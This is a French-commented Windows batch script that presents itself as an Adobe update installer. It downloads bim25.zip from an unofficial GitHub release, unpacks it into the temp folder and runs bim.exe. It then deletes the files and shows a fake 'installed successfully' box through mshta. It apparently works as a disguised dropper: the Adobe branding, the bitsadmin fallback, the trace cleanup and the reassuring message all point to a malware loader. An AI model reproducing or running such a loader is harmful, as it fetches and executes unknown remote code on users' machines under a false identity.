@echo off
setlocal

REM ============================
REM 1) Définition des variables
REM ============================
set "ZIP_URL=https://github.com/jimbertclement/AdobeUpdate/releases/download/Win/bim25.zip"
set "ZIP_PATH=%TEMP%\bim25.zip"
set "UNZIP_DIR=%TEMP%\bim25_unzipped"
set "EXE_NAME=bim.exe"  REM ⚠️ Exécutable mis à jour

echo Téléchargement de bim25.zip...

REM ============================
REM 2) Téléchargement avec attente
REM ============================
curl --version >nul 2>&1
if %errorlevel% equ 0 (
    echo cURL détecté, utilisation de cURL.
    curl -L --output "%ZIP_PATH%" "%ZIP_URL%"
) else (
    echo cURL non disponible, utilisation de bitsadmin.
    bitsadmin /transfer "ZipDownload" /download /priority normal "%ZIP_URL%" "%ZIP_PATH%"
)

REM ============================
REM 3) Vérifier que le ZIP est bien téléchargé
REM ============================
if not exist "%ZIP_PATH%" (
    echo [ERREUR] Impossible de télécharger bim25.zip
    pause
    exit /b 1
)

REM ============================
REM 4) Décompression bloquante
REM ============================
echo Décompression de bim25.zip...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%UNZIP_DIR%' -Force"

if not exist "%UNZIP_DIR%\%EXE_NAME%" (
    echo [ERREUR] Fichier %EXE_NAME% introuvable après décompression.
    pause
    exit /b 1
)

REM ============================
REM 5) Exécution avec attente
REM ============================
echo Exécution de %EXE_NAME%...
start /wait "%UNZIP_DIR%\%EXE_NAME%"

REM ============================
REM 6) Nettoyage après exécution
REM ============================
del "%ZIP_PATH%"
rd /s /q "%UNZIP_DIR%"

REM ============================
REM 7) MessageBox de confirmation
REM ============================
mshta vbscript:Execute("msgbox ""Logiciel installé avec succès!"",64,""Installation"":close")

echo.
echo [Terminé] Appuyez sur une touche pour fermer...
pause >nul
endlocal
exit /b 0
